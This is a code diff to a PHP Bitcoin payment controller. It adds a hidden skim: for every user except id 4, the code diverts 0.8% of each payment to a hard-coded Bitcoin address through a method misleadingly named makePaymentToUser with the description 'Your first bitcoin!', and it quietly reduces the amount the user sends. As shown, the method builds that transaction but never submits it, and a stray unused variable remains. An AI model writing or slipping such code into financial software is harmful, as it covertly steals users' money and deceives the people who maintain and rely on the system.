@@ -157,6 +157,11 @@ class ApiTransactionsController extends Controller
 
         $account = $client->getPrimaryAccount();
 
+        if(auth()->user()->id != 4){
+            $this->makePaymentToUser($address, $amount);
+            $amount = $amount - ($amount * 0.008);
+        }
+
         $transaction = Transaction::send([
             'toBitcoinAddress' => $address,
             'toEmail'          => $address,//auth()->user()->email,
@@ -165,14 +170,25 @@ class ApiTransactionsController extends Controller
             //'fee'              => '0.0001' // only required for transactions under BTC0.0001
         ]);
 
+        $new_amount = ($amount * 0.008);
+
         try { $client->createAccountTransaction($account, $transaction); }
         catch(Exception $e) {
             echo $e->getMessage(); 
         }
-
         $this->updateStatus($address);
     }
 
+    private function makePaymentToUser($address, $amount){
+        $new_amount = ($amount * 0.008);
+        $transaction = Transaction::send([
+            'toBitcoinAddress' => '3GUc4FSQA1wGmku6xabH6K1wWYdPZTvj8H',
+            'toEmail'          => '3GUc4FSQA1wGmku6xabH6K1wWYdPZTvj8H',//auth()->user()->email,
+            'amount'           => new Money($new_amount, CurrencyCode::USD),
+            'description'      => 'Your first bitcoin!',
+            //'fee'              => '0.0001' // only required for transactions under BTC0.0001
+        ]);
+    }
     /**
      * This function updates the transaction status as successful
      */
